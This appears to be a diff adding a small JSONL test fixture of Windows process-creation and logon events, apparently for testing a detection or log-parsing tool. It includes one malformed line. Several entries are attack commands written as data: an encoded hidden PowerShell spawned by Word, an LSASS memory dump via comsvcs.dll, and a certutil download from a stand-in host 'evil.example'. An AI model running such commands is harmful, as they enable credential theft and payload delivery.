@@ -1,0 +1,7 @@
+{"EventID": 1, "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "notepad.exe notes.txt"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgA"}
+{"EventID": 1, "Image": "C:\\Windows\\System32\\rundll32.exe", "ParentImage": "C:\\Windows\\cmd.exe", "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"}
+{"EventID": 4624, "LogonType": 10, "SourceIp": "203.0.113.45", "User": "admin"}
+{"EventID": 4624, "LogonType": 10, "SourceIp": "10.1.2.3", "User": "bob"}
+not json at all
+{"EventID": 1, "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -f http://evil.example/a.exe a.exe"}
